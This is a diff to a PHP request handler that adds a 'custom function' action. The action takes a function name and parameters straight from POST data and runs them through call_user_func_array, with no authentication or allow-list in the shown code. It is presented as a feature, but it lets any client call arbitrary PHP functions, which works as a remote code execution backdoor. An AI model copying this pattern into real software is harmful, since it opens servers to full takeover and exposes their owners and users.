@@ -617,6 +617,22 @@ if (isset($_GET["action"]) && !empty($_GET["action"]) && $_GET["action"] == 'rat
     }
 }
 
+##CUSTOM FUNCTION CODE GOES HERE##Params are tilde ` separated
+if(!empty($_POST['action']) && $_POST['action'] == 'custom_function')
+{    
+    $functionName = $_POST['function'];
+    $functionParams = $_POST['params'];
+    
+    $functionParams = explode("`", $functionParams);
+    
+    $functionParams = array_map('trim', $functionParams);    
+    
+    if(function_exists($functionName) )
+    {
+        call_user_func_array($functionName, $functionParams);
+    }    
+}
+
 
 
 
